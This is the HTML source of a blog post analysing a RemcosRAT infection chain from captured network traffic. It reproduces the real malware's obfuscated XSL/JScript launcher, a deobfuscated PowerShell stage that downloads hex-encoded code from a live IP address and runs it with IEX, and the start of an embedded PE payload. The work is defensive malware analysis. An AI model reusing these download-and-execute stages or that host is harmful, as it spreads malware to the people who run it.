@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+
+<meta charset="utf-8" >
+
+<title>Remcosrat - Excel Macro Analysis</title>
+<meta name="keywords" content="Remcosrat - Excel Macro Analysis, LaByte">
+<meta name="description" content="RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+
+<link rel="stylesheet" href="/style/jquery.fancybox.min.css">
+
+
+
+
+    <link rel="stylesheet" href="/style/prism.css"/>
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="http://thuri10.github.io">
+        <img class="avatar" src="/images/avatar.png" alt="" width="32px" height="32px">
+      </a>
+      <a href="http://thuri10.github.io">
+        <h1 class="site-title">LaByte</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        Home
+      </a>
+    
+  
+    
+      <a href="/archives" class="menu purple-link">
+        Archives
+      </a>
+    
+  
+    
+      <a href="/about" class="menu purple-link">
+        About
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">Remcosrat - Excel Macro Analysis</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2022-01-25</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/Malware/">
+              Malware
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/reverse/">
+              reverse
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <p>RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions.This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection chain can be described as shown by image <a target="_blank" rel="noopener" href="https://twitter.com/Unit42_Intel/status/1478744612516900868">@Unit 42</a>.</p>
+<p><img src="/images/mal/remcosrat/chain.jpeg" alt="Infection Chain"></p>
+<p>The infection chain start through phishing of the targets through mail services and the final payload of the infection chain is the used for communicating through TCP port 10174 as shown in the image.</p>
+<p>The samples and IOC can be downloaded from malware-traffic-analysis website <a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2022/01/04/index.html">RemcosRat sample</a>.</p>
+<h2 id="Pcap-Analysis"><a href="#Pcap-Analysis" class="headerlink" title="Pcap Analysis"></a>Pcap Analysis</h2><p><a target="_blank" rel="noopener" href="https://twitter.com/malware_traffic/status/1478755988023001089">Brad</a> has provided infection traffic pcap of the malware samples in his website.</p>
+<p><img src="/images/mal/remcosrat/http_filter.png" alt="Http filter"></p>
+<p>Image above shows a Filter of <strong>http</strong> traffic in wireshark used for downloading further executables into infected machine.The malware gets additional samples using <strong>GET</strong> method as highlighted.</p>
+<p>From the tweet provided by <strong>unit42intel</strong>, the above link of the onedrive downloads a <code>VBS</code> file. The vbs file is not available in the onedrive at the time of writting but it is provided in malware-traffic-analysis website.</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Object moved<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>
+      Object moved to
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>
+        <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://onedrive.live.com/download?cid=64F8294A00286885<span class="token entity named-entity" title="&amp;">&amp;amp;</span>resid=64F8294A00286885%21770<span class="token entity named-entity" title="&amp;">&amp;amp;</span>authkey=ABI3zrc6BsVUKxU<span class="token punctuation">"</span></span>
+        <span class="token punctuation">></span></span>here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span>
+      <span class="token punctuation">></span></span>.
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Verify the sha256 hash of the <code>misc.vbs</code> matches the one provided in IOCs of Remcos Rat.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@remcosrat$ shasum <span class="token parameter variable">-a</span> <span class="token number">256</span> misc.vbs
+95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="Stage2-Downloader-atcn-jpg"><a href="#Stage2-Downloader-atcn-jpg" class="headerlink" title="Stage2 - Downloader (atcn.jpg)"></a>Stage2 - Downloader (atcn.jpg)</h2><p>Right click the <code>GET /atcn.jpg</code> url in wireshark and follow the <strong>http</strong> stream. The HTTP streams of the urls accessed by the malware as shown below.</p>
+<p><img src="/images/mal/remcosrat/stage1_stream.png" alt="url wireshark"></p>
+<p>Malware is executing a powershell script which is obsfuscated. For further analysis we can export all the http objects. To export http objects, click <code>File -&gt; Export Objects -&gt; HTTP</code> in wireshark. select saveall to download all the http objects in malware connection traffic.</p>
+<p><img src="/images/mal/remcosrat/exported_http.png" alt="Export Http objects "></p>
+<p>The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> atcn.jpg
+atcn.jpg: ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">4130</span><span class="token punctuation">)</span>, with CRLF line terminators
+$ <span class="token function">file</span> calient.jpg
+calient.jpg: ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span>, with no line terminators<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Below is the obfuscated powershell script.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>xsl<span class="token operator">:</span>stylesheet version<span class="token operator">=</span><span class="token string">"1.0"</span>
+      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>xsl<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/XSL/Transform"</span>
+      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>msxsl<span class="token operator">=</span><span class="token string">"urn:schemas-microsoft-com:xslt"</span>
+      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>user<span class="token operator">=</span><span class="token string">"http://mycompany.com/mynamespace"</span><span class="token operator">></span>
+
+ <span class="token operator">&lt;</span>msxsl<span class="token operator">:</span>script language<span class="token operator">=</span><span class="token string">"JScript"</span> <span class="token keyword">implements</span><span class="token operator">-</span>prefix<span class="token operator">=</span><span class="token string">"user"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token constant">CDATA</span><span class="token punctuation">[</span>
+
+
+<span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">"5368656c6c2e4170706c69636174696f6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">var</span> yy<span class="token operator">=</span>r<span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"powershell.exe"</span><span class="token punctuation">,</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">"202444436F626356456D76694A72416B484D595547573D273237253542253736253646253639253634253237253230253242253230253237253544253230253542253533253739253733253734253237253230253242253230253237253635253644253245253532253635253636253643253635253237253230253242253230253237253633253734253639253646253645253245253431253733253733253635253237253230253242253230253237253644253632253643253739253544253341253341253443253646253631253634253537253639253237253230253242253230253237253734253638253530253631253732253734253639253631253643253445253631253644253635253238253237253237253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253237253237253239253237253743253439253435253538253342253234253734253335253336253636253637253230253344253230253542253435253645253735253644253544253341253341253534253646253446253632253641253635253633253734253238253542253533253739253733253734253635253644253245253445253635253734253245253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253534253739253730253635253544253243253230253333253330253337253332253239253342253542253533253739253733253734253635253644253245253445253635253734253245253533253635253732253736253639253633253635253530253646253639253645253734253444253631253645253631253637253635253732253544253341253341253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253230253344253230253234253734253335253336253636253637253342253634253646253230253742253234253730253639253645253637253230253344253230253734253635253733253734253244253633253646253645253645253635253633253734253639253646253645253230253244253633253646253644253730253230253637253646253646253637253643253635253245253633253646253644253230253244253633253646253735253645253734253230253331253230253244253531253735253639253635253734253744253230253735253645253734253639253643253230253238253234253730253639253645253637253239253342253234253734253734253739253344253237253238253445253635253737253244253237253242253237253446253632253641253635253237253242253237253633253734253230253445253635253237253242253237253734253245253537253635253237253242253237253632253433253643253639253237253242253237253635253645253734253239253237253743253439253630253435253630253538253342253234253644253736253344253230253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253439253645253734253635253732253631253633253734253639253646253645253544253341253341253433253631253643253643253432253739253645253631253644253635253238253234253734253734253739253243253237253434253646253737253645253643253646253631253634253533253734253732253639253645253637253237253243253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253433253631253643253643253534253739253730253635253544253341253341253444253635253734253638253646253634253243253237253638253734253734253730253237253230253242253230253237253341253246253246253331253330253334253245253332253332253333253245253331253331253339253245253331253336253337253246253633253631253643253639253635253645253734253245253641253730253637253237253239253342253234253732253337253338253636253634253330253330253330253733253634253344253230253234253644253736253230253244253733253730253643253639253734253230253237253235253237253230253743253436253646253732253435253631253633253638253244253446253632253641253635253633253734253230253742253542253633253638253631253732253544253542253632253739253734253635253544253232253330253738253234253546253232253744253342253234253739253335253641253638253336253332253634253636253330253344253230253439253630253435253630253538253238253234253732253337253338253636253634253330253330253330253733253634253230253244253641253646253639253645253230253237253237253239273B246A6D3D2444436F626356456D76694A72416B484D595547572E53706C69742827252729207C20666F7245616368207B5B636861725D285B636F6E766572745D3A3A746F696E74313628245F2C313629297D3B496045605828246A6D202D6A6F696E20272729"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token parameter">hex</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hex<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> str <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> str<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>msxsl<span class="token operator">:</span>script<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>xsl<span class="token operator">:</span>stylesheet<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>First decode the string we are passing to <strong>ActiveXObject</strong> function.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token parameter">hex</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hex<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>
+    str <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> str<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">"5368656c6c2e4170706c69636174696f6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Executing the above javascript code, our hexstring string parameter is decoded to <code>Shell.Application</code>.</p>
+<p>Below is the deobfuscated powershell script which is passed <code>shell.Application</code> as shown in the obsfucated script.</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token string">'[void] [System.Reflection.Assembly]::LoadWithPartialName(''Microsoft.VisualBasic'')'</span><span class="token punctuation">|</span><span class="token function">IEX</span><span class="token punctuation">;</span>
+<span class="token variable">$t56fg</span> = <span class="token namespace">[Enum]</span>::ToObject<span class="token punctuation">(</span><span class="token namespace">[System.Net.SecurityProtocolType]</span><span class="token punctuation">,</span> 3072<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token namespace">[System.Net.ServicePointManager]</span>::SecurityProtocol = <span class="token variable">$t56fg</span><span class="token punctuation">;</span>
+<span class="token keyword">do</span> <span class="token punctuation">&#123;</span><span class="token variable">$ping</span> = <span class="token function">test-connection</span> <span class="token operator">-</span>comp google<span class="token punctuation">.</span>com <span class="token operator">-</span>count 1 <span class="token operator">-</span>Quiet<span class="token punctuation">&#125;</span> <span class="token keyword">until</span> <span class="token punctuation">(</span><span class="token variable">$ping</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$tty</span>=<span class="token string">'(New-Object Net.WebClient)'</span><span class="token punctuation">|</span>I`E`X<span class="token punctuation">;</span>
+<span class="token variable">$mv</span>= <span class="token namespace">[Microsoft.VisualBasic.Interaction]</span>::CallByname<span class="token punctuation">(</span><span class="token variable">$tty</span><span class="token punctuation">,</span><span class="token string">'DownloadString'</span><span class="token punctuation">,</span><span class="token namespace">[Microsoft.VisualBasic.CallType]</span>::Method<span class="token punctuation">,</span><span class="token string">'http://104.223.119.167/calient.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$r78fd000sd</span>= <span class="token variable">$mv</span> <span class="token operator">-</span>split <span class="token string">'%'</span> <span class="token punctuation">|</span><span class="token function">ForEach-Object</span> <span class="token punctuation">&#123;</span><span class="token namespace">[char]</span><span class="token namespace">[byte]</span><span class="token string">"0x<span class="token variable">$_</span>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token variable">$y5jh62df0</span>= I`E`X<span class="token punctuation">(</span><span class="token variable">$r78fd000sd</span> <span class="token operator">-join</span> <span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the <code>calient.jpg</code> url.</p>
+<h2 id="Stage3-Downloader-calient-jpg"><a href="#Stage3-Downloader-calient-jpg" class="headerlink" title="Stage3 - Downloader (calient.jpg)"></a>Stage3 - Downloader (calient.jpg)</h2><p>Stage two downloads third obfuscated script strings in calient.jpg url. String is obfuscated and is larger than second stage <code>atcn.jpg</code> string. Looking at the obfuscated strings we have an interesting string referenced by <code>ftIXfysfU</code> variable.</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">$y='[System.AppDomain]'|W0B4J;
+$g55=$y.GetMethod("get_CurrentDomain")
+
+ [String]$ftIXfysfU='4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The string above seems to be an executable. This is because of the header file magic of PE executable. The magic number <code>4D5A</code> or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.</p>
+<p><img src="/images/mal/remcosrat/pehead.png" alt="Http filter"></p>
+<p>The python script belows decoded the bytes and returs an PE executable.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#convert bytearray to PE</span>
+remcosPE<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'4D5A90000300000004000000FFFc....'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'open.exe'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> filepe<span class="token punctuation">:</span>
+    filepe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>remcosPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Now we have a fully RemcosRat malware, which is a .NET family malware.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">remcosrat$ <span class="token function">file</span> open.exe
+open.exe: PE32 executable <span class="token punctuation">(</span>DLL<span class="token punctuation">)</span> <span class="token punctuation">(</span>console<span class="token punctuation">)</span> Intel <span class="token number">80386</span> Mono/.Net assembly, <span class="token keyword">for</span> MS Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Next step is analyzing dropped PE file.</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2022/01/04/index.html">https://www.malware-traffic-analysis.net/2022/01/04/index.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://twitter.com/Unit42_Intel/status/1478744612516900868/">https://twitter.com/Unit42_Intel/status/1478744612516900868/</a></li>
+</ol>
+
+        </div>
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Pcap-Analysis"><span class="top-box-text">Pcap Analysis</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Stage2-Downloader-atcn-jpg"><span class="top-box-text">Stage2 - Downloader (atcn.jpg)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Stage3-Downloader-calient-jpg"><span class="top-box-text">Stage3 - Downloader (calient.jpg)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#References"><span class="top-box-text">References</span></a></li></ol>
+        </div>
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/ROP-callme/">
+          <h3 class="post-title">
+            Next: ROPEmporium - Callme
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/thuri10" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/thuri0" target="_blank">
+          <i class="icon icon-twitter"></i>
+        </a>
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+      </div>
+      
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.fancybox.min.js"></script>
+
+
+
+    <script>window.is_post = true;</script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+    </div>
+  </body>
+</html>
+
